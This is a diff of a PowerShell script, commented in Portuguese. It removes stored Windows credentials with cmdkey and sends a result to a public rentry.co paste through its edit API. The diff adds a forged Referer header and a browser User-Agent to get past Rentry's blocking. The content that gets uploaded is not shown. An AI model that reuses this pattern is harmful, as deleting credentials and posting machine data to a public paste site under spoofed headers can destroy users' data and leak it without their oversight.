@@ -135,7 +135,7 @@ function Remove-WindowsCredentials {
 
     $removed = @()
 
-    # Tenta usar o cmdkey.exe com caminho explícito caso o PATH não esteja configurado
+    # Garante o uso do executavel do System32 mesmo sem admin/PATH
     $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
     if (-not (Test-Path $cmdkeyPath)) {
         $cmdkeyPath = "cmdkey.exe"
@@ -346,11 +346,17 @@ try {
     # Garante o uso de TLS 1.2 para conexao HTTPS segura
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+    # Cabeçalhos HTTP para evitar bloqueios de Referer / User-Agent pelo Rentry
+    $headers = @{
+        "Referer"    = "https://rentry.co/"
+        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    }
+
     # 1. Obtem o conteudo atual do Rentry para nao sobrescrever
     $rawUrl = "https://rentry.co/api/raw/$rentryEntryUrl"
     $conteudoAtual = ""
     try {
-        $responseRaw = Invoke-RestMethod -Uri $rawUrl -Method Get -ErrorAction Stop
+        $responseRaw = Invoke-RestMethod -Uri $rawUrl -Method Get -Headers $headers -ErrorAction Stop
         if ($responseRaw -and $responseRaw.status -eq "200") {
             $conteudoAtual = $responseRaw.content
         }
@@ -373,7 +379,7 @@ try {
     }
 
     $editUrl = "https://rentry.co/api/edit"
-    $editResponse = Invoke-RestMethod -Uri $editUrl -Method Post -Body $body -ErrorAction Stop
+    $editResponse = Invoke-RestMethod -Uri $editUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
 
     if ($editResponse.status -eq "200") {
         Write-Host "[✓] Resultado salvo com sucesso em https://rentry.co/$rentryEntryUrl" -ForegroundColor Green
